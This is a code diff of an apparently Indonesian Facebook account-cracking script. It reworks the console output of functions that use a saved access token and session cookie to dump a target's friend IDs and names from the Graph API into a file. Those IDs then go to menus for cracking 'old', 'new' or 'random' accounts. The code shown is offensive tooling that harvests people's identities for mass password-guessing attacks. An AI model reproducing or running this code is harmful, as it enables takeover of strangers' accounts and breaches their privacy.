@@ -834,31 +834,31 @@ def result():
 tampung=[]
 
 def publikv2():
-	with requests.Session() as ses:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-				
-		print(f"{kun}╭────────────────────────────────────────────{puti}")
-		a = input('└──[ masukan id target: ')
-		filetex = input(f" [+] Nama File Dump  : ")
-		rspd  = ('/sdcard/RUDAL-DUMP/' + filetex + '.txt').replace(' ', '_')
-		koli = open(rspd, 'w')
-		try:
-			params = {
+    with requests.Session() as ses:
+        banner()
+        token = open('.token.txt','r').read()
+        cok = open('.cok.txt','r').read()
+        a = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
+        filetex = console.input(f" {H2}• {P2}Nama File Dump  :{U2} ")
+        rspd  = ('/sdcard/RUDAL-DUMP/' + filetex + '.txt').replace(' ', '_')
+        koli = open(rspd, 'w')
+        try:
+            params = {
 			"access_token": token, 
 			"fields": "name,friends.fields(id,name,birthday)"
 			}
-			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
-			for c in b["friends"]["data"]:
-				id.append(c["id"]+"|"+c["name"])
-				koli.write(c['id']+'|'+c['name']+ '\n')
-				print('\r  Mengumpulkan %s Id'%(len(id)),end='')
-				time.sleep(0.0050)
-			print(f"{kun}╭────────────────────────────────────────────{puti}")
-			print('└──[ Total Idz : {}'.format(len(id)))
-			exit()
-		except Exception as e:
-			print(e)
+            b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
+            for c in b["friends"]["data"]:
+                id.append(c["id"]+"|"+c["name"])
+                koli.write(c['id']+'|'+c['name']+ '\n')
+                console.print(f'\r {H2}• {P2}Mengumpulkan {H2} %s {P2} Id'%(len(id)),end='\r')
+                time.sleep(0.0050)
+            console.print(f' {H2}• {P2}Total Id Dump :{H2} %s {P2} '%(len(id)))
+            console.print(f' {H2}• {P2}File Disimpan Di {H2}%s{P2}'%(rspd))
+            time.sleep(3)
+            exit('\n{H2}Thank Sudah Mengunakan Script Ini{P2}\n')
+        except Exception as e:
+            print(e)
 
 #-------------------[ CRACK-PUBLIK-MASSAL]----------------#
 
@@ -868,8 +868,7 @@ def publik():
 	with requests.Session() as ses:
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()		
-		print(f"{kun}╭────────────────────────────────────────────{puti}")
-		a = input('└──[ masukan id target: ')
+		a = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
 		try:
 			params = {
 			"access_token": token, 
@@ -878,8 +877,7 @@ def publik():
 			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
 			for c in b["friends"]["data"]:
 				id.append(c["id"]+"|"+c["name"])
-			print(f"{kun}╭────────────────────────────────────────────{puti}")
-			print('└──[ Total Idz : {}'.format(len(id)));setting()
+			setting()
 		except Exception as e:
 			print(e)
 #-------------------[ CRACK-PUBLIK ]----------------#
@@ -970,7 +968,7 @@ def cektahun(fx):
  
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
-    Console().print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Crack akun Old [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Crack Akun New [/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Crack Akun Random [[bold green]Recommended[bold white]][/]', title="[bold green] PILIH",width=80,style=f"{color_panel}"))
+    Console().print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Crack akun Old [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Crack Akun New [/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Crack Akun Random [[bold green]Recommended[bold white]][/]', title='[bold green] %s '%(len(id)),width=80,style=f"{color_panel}"))
     hu = console.input(f" {H2}• {P2}Masukan : ")
     if hu in ['1','01']:
         for tua in sorted(id):
@@ -1089,7 +1087,7 @@ def passwrd():
 	if li in ['Y','y']:
 		back()
 	else:
-		Console().print(f"[bold cyan]   	 [bold yellow]God Bye Kawan")
+		Console().print(f"[bold green]	\n[bold yellow]God Bye Kawan")
 		time.sleep(2)
 		exit()
 
